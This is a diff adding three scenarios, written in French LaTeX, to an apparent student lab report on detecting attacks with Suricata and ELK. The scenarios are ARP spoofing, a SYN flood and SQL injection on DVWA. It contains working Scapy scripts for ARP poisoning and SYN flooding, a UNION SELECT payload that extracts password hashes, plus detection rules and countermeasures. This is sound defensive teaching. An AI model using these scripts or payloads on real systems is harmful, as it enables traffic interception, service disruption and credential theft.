@@ -498,19 +498,556 @@ commande) constitue une piste d'amélioration naturelle.
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-\section{Scénario 4}\label{sec:Q5} 
+\section{Scénario 4 : usurpation ARP (ARP spoofing)}\label{sec:Q5}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{Contexte et objectif}
+
+Ce scénario reproduit une \textbf{usurpation ARP} (\textit{ARP spoofing}), brique
+élémentaire d'une attaque \textit{Man-in-the-Middle}. Contrairement à un simple
+balayage de ports (reconnaissance sans modification de la cible), l'empoisonnement
+ARP est une attaque \textbf{active}~: elle altère l'état de la victime en
+corrompant sa table de voisinage (cache ARP).
+
+L'objectif pédagogique est double~: mener l'attaque en laboratoire isolé et
+évaluer ce que notre chaîne de détection en retient. Ce cas met en évidence une
+limite des IDS à signatures~: le trafic ARP opère en couche~2 et n'est pas couvert
+par les règles Emerging Threats classiques. La détection repose alors sur la
+\textbf{journalisation ARP} de Suricata~8.0 (désactivée par défaut) et sur une
+\textbf{corrélation d'anomalie} du type «~une même IP revendiquée par plusieurs
+adresses MAC~».
+
+\subsection{Environnement de test}
+
+\begin{itemize}[nosep]
+  \item \textbf{Attaquant}~: poste Windows (\texttt{192.168.56.1}), Scapy et
+        Npcap, interface VirtualBox \textit{Host-Only} «~Ethernet~3~».
+  \item \textbf{Victime}~: VM \texttt{IDS-Lab} (\texttt{192.168.56.101},
+        Ubuntu, interface \texttt{enp0s8}).
+  \item \textbf{Réseau}~: segment privé VirtualBox \texttt{192.168.56.0/24}
+        (isolé du LAN \texttt{192.168.2.0/24} utilisé pour d'autres scénarios).
+  \item \textbf{Capteur}~: Suricata~8.0.3 sur \texttt{enp0s3} et \texttt{enp0s8},
+        \texttt{HOME\_NET = 192.168.56.0/24}.
+  \item \textbf{Pipeline}~: Suricata $\rightarrow$ Filebeat $\rightarrow$
+        Elasticsearch $\rightarrow$ Kibana.
+  \item \textbf{MAC falsifiée injectée}~: \texttt{00:11:22:33:44:55}~;
+        MAC légitime de \texttt{192.168.56.1}~: \texttt{0a:00:27:00:00:0b}.
+\end{itemize}
+
+\subsection{Préparation du capteur}
+
+Par défaut, le type d'événement \texttt{arp} existe dans la sortie EVE de
+Suricata mais reste désactivé (volume élevé). Il faut l'activer dans
+\texttt{/etc/suricata/suricata.yaml}, section \texttt{outputs > eve-log > types}~:
+
+\begin{verbatim}
+        - arp:
+            enabled: yes        # no par défaut
+\end{verbatim}
+
+Puis valider et redémarrer le service~:
+
+\begin{verbatim}
+sudo suricata -T -c /etc/suricata/suricata.yaml
+sudo systemctl restart suricata
+\end{verbatim}
+
+\subsection{Phase 1 : état initial de la victime}
+
+Avant toute injection, la table ARP de la VM associe la passerelle Windows à
+son adresse matérielle légitime et la connectivité ICMP est normale
+(Figure~\ref{fig:arp_before})~:
+
+\begin{verbatim}
+ip neigh show | grep 192.168.56.1
+# 192.168.56.1 dev enp0s8 lladdr 0a:00:27:00:00:0b REACHABLE
+ping -c 3 192.168.56.1
+\end{verbatim}
+
+\begin{figure}[htbp]
+  \centering
+  \includegraphics[width=0.92\linewidth]{Image/Image_Attaque_4/capture_1.jpg}
+  \caption{Table ARP saine (\texttt{0a:00:27:00:00:0b}) et \texttt{ping} réussi.}
+  \label{fig:arp_before}
+\end{figure}
+
+\subsection{Phase 2 : lancement de l'usurpation}
+
+Le script \texttt{Attaque Arp.py}, exécuté dans un PowerShell administrateur
+sur Windows, envoie en boucle des réponses ARP non sollicitées
+(\texttt{opcode: reply}) affirmant que \texttt{192.168.56.1} correspond au MAC
+falsifié~:
+
+\begin{verbatim}
+from scapy.all import *
+import time
+
+victime    = "192.168.56.101"
+passerelle = "192.168.56.1"
+faux_mac   = "00:11:22:33:44:55"
+
+vmac = getmacbyip(victime)
+pkt  = Ether(dst=vmac)/ARP(op=2, pdst=victime, hwdst=vmac,
+                           psrc=passerelle, hwsrc=faux_mac)
+while True:
+    sendp(pkt, iface="Ethernet 3", verbose=0)
+    time.sleep(2)
+\end{verbatim}
+
+La Figure~\ref{fig:arp_script} confirme l'empoisonnement en cours~; la victime
+doit être arrêtée avec \texttt{Ctrl+C} pour restaurer l'état réseau une fois
+le test terminé.
+
+\begin{figure}[htbp]
+  \centering
+  \includegraphics[width=0.88\linewidth]{Image/Image_Attaque_4/capture_2.jpg}
+  \caption{Script Scapy en cours d'exécution sur le poste attaquant.}
+  \label{fig:arp_script}
+\end{figure}
+
+\subsection{Phase 3 : impact sur la victime}
+
+Après quelques secondes d'injection, le cache ARP de la VM pointe la passerelle
+vers le MAC falsifié (Figure~\ref{fig:arp_after})~:
+
+\begin{verbatim}
+ip neigh show | grep 192.168.56.1
+# 192.168.56.1 dev enp0s8 lladdr 00:11:22:33:44:55 REACHABLE
+\end{verbatim}
+
+\begin{figure}[htbp]
+  \centering
+  \includegraphics[width=0.88\linewidth]{Image/Image_Attaque_4/capture_3.jpg}
+  \caption{Table ARP empoisonnée~: \texttt{192.168.56.1} associé à \texttt{00:11:22:33:44:55}.}
+  \label{fig:arp_after}
+\end{figure}
+
+\subsection{Phase 4 : détection et analyse}
+
+\subsubsection{Volume capturé}
+
+Sur la durée de l'exercice, Suricata a enregistré plusieurs milliers
+d'événements ARP~:
+
+\begin{verbatim}
+sudo grep -c -a '"event_type":"arp"' /var/log/suricata/eve.json
+# 4534
+\end{verbatim}
+
+\subsubsection{Exemple d'événement falsifié}
+
+La Figure~\ref{fig:arp_eve} montre une entrée typique~: réponse ARP directe
+vers la victime, prétendant que \texttt{192.168.56.1} est à
+\texttt{00:11:22:33:44:55}.
+
+\begin{figure}[htbp]
+  \centering
+  \includegraphics[width=\linewidth]{Image/Image_Attaque_4/capture_4.jpg}
+  \caption{Événement \texttt{event\_type: arp} falsifié dans \texttt{eve.json}.}
+  \label{fig:arp_eve}
+\end{figure}
+
+\subsubsection{Anomalie comportementale~: une IP, deux MAC}
+
+L'indicateur le plus fiable pour ce scénario est l'apparition de deux MAC
+distinctes pour une même IP source~:
+
+\begin{verbatim}
+sudo grep -a '"event_type":"arp"' /var/log/suricata/eve.json \
+  | jq -r '.arp | "\(.src_ip) -> \(.src_mac)"' | sort -u
+\end{verbatim}
+
+La Figure~\ref{fig:arp_jq} illustre le conflit sur \texttt{192.168.56.1}~:
+MAC falsifié \emph{et} MAC légitime coexistent dans les journaux --- signature
+comportementale absente des règles à signatures ET.
+
+\begin{figure}[htbp]
+  \centering
+  \includegraphics[width=0.75\linewidth]{Image/Image_Attaque_4/capture_5.jpg}
+  \caption{Corrélation \texttt{jq}~: \texttt{192.168.56.1} revendiquée par deux MAC.}
+  \label{fig:arp_jq}
+\end{figure}
+
+\subsection{Visualisation dans Kibana}
+
+Les événements ARP sont ingérés sous les champs \texttt{suricata.eve.*}, mais
+n'apparaissent pas dans les tableaux de bord Suricata préconstruits (orientés
+alertes). La preuve se construit dans \textbf{Discover} puis une visualisation
+\textbf{Lens}~:
+
+\begin{itemize}[nosep]
+  \item Data view~: \texttt{filebeat-*}
+  \item Requête KQL~: \texttt{suricata.eve.event_type : "arp"}
+  \item Table Lens~: lignes =
+        \texttt{suricata.eve.arp.src\_ip} et \texttt{suricata.eve.arp.src\_mac},
+        métrique = nombre d'enregistrements.
+\end{itemize}
+
+La Figure~\ref{fig:arp_kibana} montre le volume massif du MAC falsifié
+(environ 1\,787 paquets) face au trafic légitime résiduel (6 paquets pour le
+MAC d'origine), alors que les autres hôtes du segment ne présentent qu'une
+association IP$\rightarrow$MAC.
+
+\begin{figure}[htbp]
+  \centering
+  \includegraphics[width=\linewidth]{Image/Image_Attaque_4/capture_6.jpg}
+  \caption{Table Kibana~: \texttt{192.168.56.1} associée à deux adresses MAC.}
+  \label{fig:arp_kibana}
+\end{figure}
+
+La Table~\ref{tab:arp_fields} résume les champs utiles pour filtrer ce scénario.
+
+\begin{table}[htbp]
+  \centering
+  \begin{tabular}{@{}lll@{}}
+    \toprule
+    \textbf{Donnée} & \textbf{Champ Kibana} & \textbf{Exemple} \\
+    \midrule
+    Type d'événement   & \texttt{suricata.eve.event\_type} & \texttt{arp} \\
+    IP source ARP      & \texttt{suricata.eve.arp.src\_ip}  & \texttt{192.168.56.1} \\
+    MAC source ARP     & \texttt{suricata.eve.arp.src\_mac} & \texttt{00:11:22:33:44:55} \\
+    Opération          & \texttt{suricata.eve.arp.opcode}   & \texttt{reply} \\
+    Interface captée   & \texttt{suricata.eve.in\_iface}    & \texttt{enp0s8} \\
+    \bottomrule
+  \end{tabular}
+  \caption{Champs Elasticsearch pour l'analyse ARP dans Kibana.}
+  \label{tab:arp_fields}
+\end{table}
+
+\subsection{Contre-mesures}
+
+\begin{table}[htbp]
+  \centering
+  \begin{tabular}{@{}p{3.2cm}p{9.5cm}@{}}
+    \toprule
+    \textbf{Mesure} & \textbf{Description} \\
+    \midrule
+    Entrées ARP statiques &
+    Figer l'association IP$\leftrightarrow$MAC des hôtes critiques
+    (\texttt{ip neigh add ... nud permanent}). \\
+    Dynamic ARP Inspection &
+    Sur switch managé~: valider les réponses ARP contre une table
+    \textit{DHCP snooping}. \\
+    Segmentation / port security &
+    Réduire le domaine de broadcast et limiter les MAC autorisés par port. \\
+    Surveillance continue &
+    Journalisation ARP Suricata + alerte sur conflit IP$\leftrightarrow$MAC~;
+    outils dédiés (\texttt{arpwatch}). \\
+    Chiffrement de bout en bout &
+    Atténue l'impact d'une interception (TLS, SSH, VPN). \\
+    \bottomrule
+  \end{tabular}
+  \caption{Contre-mesures face à l'usurpation ARP.}
+  \label{tab:arp_mitigation}
+\end{table}
+
+\subsection{Synthèse}
+
+L'attaque a corrompu avec succès le cache ARP de la victime
+(\texttt{192.168.56.1} $\rightarrow$ \texttt{00:11:22:33:44:55}). Aucune
+alerte Emerging Threats n'a été générée pour cette activité de couche~2~;
+seule l'activation explicite de la journalisation ARP, suivie d'une analyse
+IP$\leftrightarrow$MAC (4\,534 événements, dont une IP revendiquée par deux
+MAC), a permis de caractériser l'incident. Ce scénario plaide pour combiner
+détection par signatures et détection d'anomalies, y compris sur les protocoles
+de bas niveau souvent absents des tableaux de bord applicatifs.
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\section{Scénario 5 : déni de service SYN flood}\label{sec:Q6}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{Contexte et objectif}
+
+Ce scénario couvre l'axe \textbf{disponibilité} de la triade CIA. L'attaque consiste
+à inonder la cible de paquets TCP ne portant que le drapeau \texttt{SYN}, sans
+jamais achever la poignée de main en trois temps~: chaque demi-connexion vise à
+épuiser les ressources du service ciblé (signature classique d'un \textit{SYN flood}).
+
+L'objectif est de valider la chaîne complète~: exécution depuis le poste attaquant,
+déclenchement d'une \textbf{règle Suricata locale} (\texttt{sid:1000002}),
+journalisation (\texttt{fast.log}), remontée Filebeat et visualisation du pic
+d'alertes dans Kibana.
+
+\subsection{Environnement de test}
+
+\begin{itemize}[nosep]
+  \item \textbf{Attaquant}~: Windows~11 (\texttt{192.168.56.1}), réseau VirtualBox
+        \textit{Host-Only}, script Python/Scapy (\texttt{syn\_flood.py}).
+  \item \textbf{Cible}~: VM \texttt{IDS-Lab} (\texttt{192.168.56.101}), port TCP~80.
+  \item \textbf{Capteur}~: Suricata~8.0.3 sur \texttt{enp0s8},
+        \texttt{HOME\_NET} incluant \texttt{192.168.56.0/24}.
+  \item \textbf{Supervision}~: \texttt{eve.json} $\rightarrow$ Filebeat
+        $\rightarrow$ Elasticsearch~8.19.21 $\rightarrow$ Kibana~8.19.21.
+  \item \textbf{Accès SSH}~: \texttt{ssh madeo@127.0.0.1 -p 2222} (redirection
+        depuis l'hôte Windows vers la VM).
+\end{itemize}
+
+\subsection{Règle de détection Suricata}
+
+Une règle personnalisée (\texttt{sid:1000002}) alerte lorsque plus de 20 paquets
+\texttt{SYN} atteignent le port~80 d'une même destination en 10~secondes
+(\texttt{detection\_filter}).
+
+\textbf{Point critique}~: la règle doit être placée dans le fichier réellement
+chargé par le moteur (\texttt{default-rule-path} dans \texttt{suricata.yaml}),
+typiquement \texttt{/var/lib/suricata/rules/local.rules} --- et non
+\texttt{/etc/suricata/rules/local.rules}, sinon elle est ignorée malgré un
+\texttt{reload-rules} réussi.
+
+\begin{verbatim}
+alert tcp any any -> $HOME_NET 80 (msg:"LOCAL SYN Flood - possible DoS";
+    flags:S; detection_filter:track by_dst, count 20, seconds 10;
+    classtype:denial-of-service; sid:1000002; rev:1;)
+\end{verbatim}
+
+Rechargement à chaud~: \texttt{sudo suricatasc -c reload-rules}.
+
+\subsection{Phase 1 : exécution de l'attaque}
+
+Le script envoie 3\,000 paquets \texttt{SYN} vers \texttt{192.168.56.101:80},
+avec un port source aléatoire à chaque envoi~:
+
+\begin{verbatim}
+from scapy.all import IP, TCP, RandShort, send
+
+TARGET = "192.168.56.101"
+PORT   = 80
+COUNT  = 3000
+
+pkts = [IP(src="192.168.56.1", dst=TARGET) /
+        TCP(sport=RandShort(), dport=PORT, flags="S")
+        for _ in range(COUNT)]
+send(pkts, verbose=0)
+\end{verbatim}
+
+La Figure~\ref{fig:syn_exec} confirme l'envoi des 3\,000 paquets depuis PowerShell.
+
+\begin{figure}[htbp]
+  \centering
+  \includegraphics[width=0.92\linewidth]{Image/Image_Attaque_5/capture_1.png}
+  \caption{Exécution de \texttt{syn\_flood.py}~: 3\,000 paquets SYN vers la VM.}
+  \label{fig:syn_exec}
+\end{figure}
+
+\subsection{Phase 2 : détection Suricata}
+
+Pendant le flood, Suricata déclenche la règle \texttt{1000002} et inonde
+\texttt{fast.log} d'alertes regroupées sur quelques millisecondes, avec la
+classification «~Detection of a Denial of Service Attack~». Pour le suivi en
+direct, l'option \texttt{grep -a} est nécessaire car \texttt{fast.log} peut
+contenir des octets binaires (ARP) qui forcent \texttt{grep} en mode binaire.
+
+\begin{verbatim}
+sudo tail -f /var/log/suricata/fast.log
+sudo grep -a 1000002 /var/log/suricata/fast.log | tail -5
+\end{verbatim}
+
+\begin{figure}[htbp]
+  \centering
+  \includegraphics[width=\linewidth]{Image/Image_Attaque_5/capture_2.png}
+  \caption{Alertes «~LOCAL SYN Flood - possible DoS~» (\texttt{sid:1000002}) dans \texttt{fast.log}.}
+  \label{fig:syn_fastlog}
+\end{figure}
+
+\subsection{Phase 3 : visualisation dans Kibana}
+
+Dans Discover (\texttt{filebeat-*}), le filtre KQL suivant isole les alertes du
+flood (champ ECS \texttt{rule.id}, et non \texttt{alert.signature\_id})~:
+
+\begin{verbatim}
+event.dataset: "suricata.eve" and rule.id: "1000002"
+\end{verbatim}
+
+La Figure~\ref{fig:syn_kibana} montre un pic d'environ 2\,908 documents
+concentrés dans une fenêtre temporelle unique, preuve visuelle de la rafale DoS.
+
+\begin{figure}[htbp]
+  \centering
+  \includegraphics[width=\linewidth]{Image/Image_Attaque_5/capture_3.jpg}
+  \caption{Kibana~: pic d'alertes \texttt{rule.id:1000002} correspondant au SYN flood.}
+  \label{fig:syn_kibana}
+\end{figure}
+
+\begin{table}[htbp]
+  \centering
+  \begin{tabular}{@{}lll@{}}
+    \toprule
+    \textbf{Donnée} & \textbf{Champ Kibana} & \textbf{Exemple} \\
+    \midrule
+    Identifiant règle  & \texttt{rule.id}              & \texttt{1000002} \\
+    IP cible           & \texttt{destination.ip}       & \texttt{192.168.56.101} \\
+    Port cible         & \texttt{destination.port}     & \texttt{80} \\
+    IP attaquant       & \texttt{source.ip}            & \texttt{192.168.56.1} \\
+    Jeu de données     & \texttt{event.dataset}        & \texttt{suricata.eve} \\
+    \bottomrule
+  \end{tabular}
+  \caption{Champs utiles pour filtrer le SYN flood dans Kibana.}
+  \label{tab:syn_fields}
+\end{table}
+
+\subsection{Dépannage et leçons apprises}
+
+Deux obstacles ont été rencontrés lors de la mise en place. D'abord, une
+\textbf{boucle de redémarrage} de Suricata après modification des règles~: la
+recompilation du cache dépassait le délai systemd. Solution~: arrêter le
+service, lancer \texttt{suricata} en avant-plan jusqu'à «~Engine started~», puis
+relancer systemd. Ensuite, une règle placée dans le mauvais \texttt{local.rules}
+ne se déclenchait pas~; l'indice décisif était un message d'alerte en français
+dans \texttt{fast.log} alors que la version éditée était en anglais dans
+\texttt{/etc/suricata/rules/}.
+
+\subsection{Synthèse}
+
+À ce volume (3\,000 paquets), l'objectif n'est pas d'indisponibiliser réellement
+la cible, mais de prouver que l'IDS reconnaît la signature de l'attaque. Le
+scénario valide la chaîne attaquant $\rightarrow$ Suricata $\rightarrow$ ELK et
+rappelle que seule une règle présente dans le fichier pointé par
+\texttt{default-rule-path} est effectivement chargée.
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\section{Scénario 6 : injection SQL (DVWA)}\label{sec:Q7}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{Contexte et objectif}
+
+Ce scénario illustre une \textbf{injection SQL} (OWASP A03:2021, couche~7)~:
+insertion de code SQL malveillant dans un champ de saisie pour détourner la
+requête vers la base de données et extraire des données sensibles (identifiants
+et empreintes de mots de passe).
+
+Résultat attendu~: exploitation réussie sur DVWA, alerte d'une règle Suricata
+locale (\texttt{sid:1000003}), trace dans \texttt{fast.log}, puis événement
+consultable dans Kibana avec la charge d'attaque visible dans l'URL.
+
+\subsection{Environnement de test}
+
+\begin{itemize}[nosep]
+  \item \textbf{Attaquant}~: Windows (\texttt{192.168.56.1}), navigateur web.
+  \item \textbf{Cible}~: DVWA (\textit{Damn Vulnerable Web Application}) en
+        conteneur Docker sur la VM (\texttt{192.168.56.101:80}).
+  \item \textbf{Capteur}~: Suricata~8.0.3, inspection HTTP sur \texttt{enp0s8}.
+  \item \textbf{Supervision}~: même pipeline ELK que les scénarios précédents.
+\end{itemize}
+
+\subsection{Phase 1 : déploiement de DVWA}
+
+\begin{verbatim}
+sudo docker run -d --name dvwa -p 80:80 vulnerables/web-dvwa
+sudo docker ps
+\end{verbatim}
+
+Depuis Windows~: \texttt{http://192.168.56.101/}. Préparation~: connexion
+\texttt{admin} / \texttt{password}, «~Setup / Reset DB~», niveau de sécurité
+\textit{Low} (menu DVWA Security) pour désactiver les filtres côté application.
+
+\subsection{Phase 2 : règle de détection}
+
+La règle \texttt{1000003} inspecte l'URI HTTP et alerte si les mots-clés
+\texttt{union} et \texttt{select} y coexistent (injection de type UNION).
+Une règle \textbf{locale} est nécessaire car les règles Emerging Threats
+«~WEB\_SERVER SQL Injection~» ciblent souvent \texttt{\$EXTERNAL\_NET}
+$\rightarrow$ \texttt{\$HOME\_NET}~; or l'attaquant (\texttt{192.168.56.1})
+appartient au même \texttt{HOME\_NET} que la cible et ne serait pas détecté.
+
+\begin{verbatim}
+alert http any any -> $HOME_NET any (
+    msg:"LOCAL SQL Injection (UNION SELECT) detectee";
+    flow:to_server; http.uri; content:"union"; nocase;
+    content:"select"; nocase; distance:0;
+    classtype:web-application-attack; sid:1000003; rev:1;)
+\end{verbatim}
+
+Fichier cible~: \texttt{/var/lib/suricata/rules/local.rules}, puis
+\texttt{sudo suricatasc -c reload-rules}.
+
+\subsection{Phase 3 : exploitation}
+
+Sur la page «~SQL Injection~» de DVWA, la charge suivante est soumise dans le
+champ \textit{User ID}~:
+
+\begin{verbatim}
+1' UNION SELECT user,password FROM users-- -
+\end{verbatim}
+
+Elle ferme la valeur attendue (\texttt{1'}), ajoute un \texttt{UNION SELECT}
+sur la table \texttt{users}, et commente la fin de la requête d'origine
+(\texttt{-- -}). La Figure~\ref{fig:sqli_dvwa} montre l'exfiltration des comptes
+et empreintes MD5 (ex. \texttt{5f4dcc3b5aa765d61d8327deb882cf99} = mot de passe
+\texttt{password}), illustrant aussi le stockage faible des secrets.
+
+\begin{figure}[htbp]
+  \centering
+  \includegraphics[width=\linewidth]{Image/Image_Attaque_6/capture_1.jpg}
+  \caption{Résultat de l'injection UNION dans DVWA~: comptes et hachés MD5 affichés.}
+  \label{fig:sqli_dvwa}
+\end{figure}
+
+\subsection{Phase 4 : détection et Kibana}
+
+Lors de la soumission (souvent en GET), la charge transite dans l'URI~; Suricata
+déclenche la règle \texttt{1000003} (classification «~Web Application Attack~»,
+priorité~1). La Figure~\ref{fig:sqli_rule} regroupe l'ajout de la règle, le
+rechargement et une ligne typique de \texttt{fast.log}.
+
+\begin{verbatim}
+sudo grep -a 1000003 /var/log/suricata/fast.log | tail -5
+\end{verbatim}
+
+\begin{figure}[htbp]
+  \centering
+  \includegraphics[width=\linewidth]{Image/Image_Attaque_6/capture_2.jpg}
+  \caption{Règle \texttt{1000003}, rechargement et alerte dans \texttt{fast.log}.}
+  \label{fig:sqli_rule}
+\end{figure}
+
+Filtre Kibana (Discover, \texttt{filebeat-*})~:
+
+\begin{verbatim}
+event.dataset: "suricata.eve" and rule.id: "1000003"
+\end{verbatim}
+
+La Figure~\ref{fig:sqli_kibana} confirme la remontée ELK~; les champs d'URL
+conservent la charge en clair, preuve directement exploitable pour l'analyse
+forensique.
+
+\begin{figure}[htbp]
+  \centering
+  \includegraphics[width=\linewidth]{Image/Image_Attaque_6/capture_3.jpg}
+  \caption{Alerte d'injection SQL (\texttt{rule.id:1000003}) dans Kibana.}
+  \label{fig:sqli_kibana}
+\end{figure}
+
+\begin{table}[htbp]
+  \centering
+  \begin{tabular}{@{}lll@{}}
+    \toprule
+    \textbf{Donnée} & \textbf{Champ Kibana} & \textbf{Exemple} \\
+    \midrule
+    Identifiant règle  & \texttt{rule.id}         & \texttt{1000003} \\
+    IP cible           & \texttt{destination.ip}  & \texttt{192.168.56.101} \\
+    Port HTTP          & \texttt{destination.port}& \texttt{80} \\
+    Charge dans l'URL  & \texttt{url.original}    & \texttt{...union...select...} \\
+    IP attaquant       & \texttt{source.ip}       & \texttt{192.168.56.1} \\
+    \bottomrule
+  \end{tabular}
+  \caption{Champs Kibana pour retrouver l'injection SQL.}
+  \label{tab:sqli_fields}
+\end{table}
+
+\subsection{Synthèse}
+
+Ce scénario ajoute la dimension \textbf{applicative} (OWASP, couche~7) au
+projet~: cible volontairement vulnérable, extraction réelle de données, détection
+par signature HTTP personnalisée et corrélation dans ELK. Il complète les
+scénarios réseau (ARP, SYN flood) et middleware (ActiveMQ) par une attaque web
+classique, toujours dans un périmètre labo isolé.
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+\section{Résultat et Discussion}\label{sec:Q8}
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-\section{Scénario 5}\label{sec:Q6}
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-\section{Résultat et Discussion}\label{sec:Q7}
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-\section{Conclusion}\label{sec:Q8}
+\section{Conclusion}\label{sec:Q9}
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
 
